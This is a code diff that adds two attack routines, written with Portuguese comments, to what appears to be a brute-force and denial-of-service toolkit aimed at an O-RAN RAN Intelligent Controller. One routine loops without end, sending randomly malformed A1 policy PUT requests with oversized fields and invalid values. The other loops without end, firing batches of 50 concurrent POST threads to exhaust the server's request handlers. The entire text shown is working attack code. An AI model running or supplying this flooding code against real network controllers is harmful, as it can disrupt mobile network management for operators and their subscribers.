@@ -87,3 +87,76 @@ def tecnica2_worker_id_bruteforce():
 # ============================================================
 # TECNICA 3: POLICY PARAMETER FUZZING (rApp)
 # ============================================================
+def tecnica3_policy_fuzzing():
+    """Milhoes de combinacoes de parametros de politica A1"""
+    time.sleep(6)
+    scopes = [f"UE_GROUP_{i}" for i in range(1, 501)]
+    reasons = [
+        "ENERGY_SAVING", "LOAD_BALANCING", "QOS", "SPECTRUM",
+        "INTERFERENCE", "EMERGENCY", "MAINTENANCE", "TEST",
+        "OPTIMIZATION", "RECONFIG", "SCALE_UP", "SCALE_DOWN"
+    ]
+
+    while True:
+        try:
+            for _ in range(10):
+                # Gera combinacoes pseudo-aleatorias de parametros
+                policy = {
+                    "type": "A1_POLICY",
+                    "scope": random.choice(scopes),
+                    "value": random.choice([True, False, 0, 1, "true", "false", "enable", "disable"]),
+                    "reason": random.choice(reasons),
+                    "priority": random.choice(["low", "medium", "high", "critical", "999"]),
+                    "ttl": random.randint(-1, 99999),
+                    "nonce": random.randint(0, 2**32 - 1),
+                    "invalid_field": "x" * random.randint(1, 1000)  # Fuzzing de tamanho
+                }
+                data = json.dumps(policy).encode()
+                req = urllib.request.Request(BASE_URL, data=data, method="PUT")
+                req.add_header('Content-Type', 'application/json')
+                with urllib.request.urlopen(req, timeout=1): 
+                    pass
+
+            time.sleep(0.2)
+        except Exception as e:
+            print(f"[BF-T3:Fuzzing] Erro: {e}")
+            time.sleep(0.3)
+
+# ============================================================
+# TECNICA 4: CONCURRENT SESSION EXHAUSTION (xApp+rApp)
+# ============================================================
+def tecnica4_concurrent_exhaustion():
+    """Esgota handlers concorrentes do servidor RIC"""
+    time.sleep(9)
+
+    def requisicao_rapida():
+        try:
+            payload = {
+                "id": f"exhaust-{random.randint(1, 99999)}",
+                "latency_ms": random.random() * 100,
+                "type": "benchmark",
+                "data": "x" * random.randint(10, 500)
+            }
+            data = json.dumps(payload).encode()
+            req = urllib.request.Request(BASE_URL, data=data, method="POST")
+            req.add_header('Content-Type', 'application/json')
+            with urllib.request.urlopen(req, timeout=0.5): 
+                pass
+        except:
+            pass
+
+    while True:
+        try:
+            threads = []
+            for _ in range(50):  # 50 requisicoes simultaneas!
+                t = threading.Thread(target=requisicao_rapida, daemon=True)
+                t.start()
+                threads.append(t)
+
+            for t in threads:
+                t.join(timeout=0.3)
+
+            time.sleep(0.2)
+        except Exception as e:
+            print(f"[BF-T4:Exhaust] Erro: {e}")
+            time.sleep(0.5)
